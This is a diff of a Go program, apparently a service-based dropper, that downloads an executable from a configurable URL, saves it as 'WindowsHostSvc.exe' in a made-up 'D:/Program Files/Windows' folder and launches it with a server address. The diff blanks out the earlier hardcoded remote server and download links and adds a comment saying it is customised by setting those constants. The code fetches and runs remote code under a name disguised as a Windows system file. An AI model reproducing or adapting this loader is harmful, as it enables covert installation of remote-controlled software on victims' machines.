@@ -1,3 +1,5 @@
+// 该文件自定义方式：设置常量值即可
+
 package main
 
 import (
@@ -17,7 +19,8 @@ import (
 )
 
 const (
-	ServerAddr  = "http://rbsi.yxzl.top:5001/"
+	ServerAddr  = ""
+	DownloadUrl = ""
 	ServiceName = "ATest"
 )
 
@@ -109,15 +112,11 @@ func main() {
 
 	os.Mkdir(`D:/Program Files`, os.ModePerm)
 	os.Mkdir(`D:/Program Files/Windows`, os.ModePerm)
-	// res, _ := http.Get("https://cloud.yixiangzhilv.com/api/v3/file/source/139/main.exe?sign=SK1-ke7UMlkiBjUs8Lo4Qu1IT3TI2g94uC3VL6XQZ8c%3D%3A0")
-	res, _ := http.Get("http://127.0.0.1:90/main.exe")
+	res, _ := http.Get(DownloadUrl)
 	exe, _ := os.Create("D:/Program Files/Windows/WindowsHostSvc.exe")
 	io.Copy(exe, res.Body)
 	exe.Close()
 	StartProcessAsCurrentUser(`D:/Program Files/Windows/WindowsHostSvc.exe`, `D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr, `D:/Program Files/Windows/`, true)
-	f, _ := os.Create("D:/Desktop/log.txt")
-	f.WriteString(`D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr)
-	f.Close()
 
 	time.Sleep(time.Second * 1)
 }
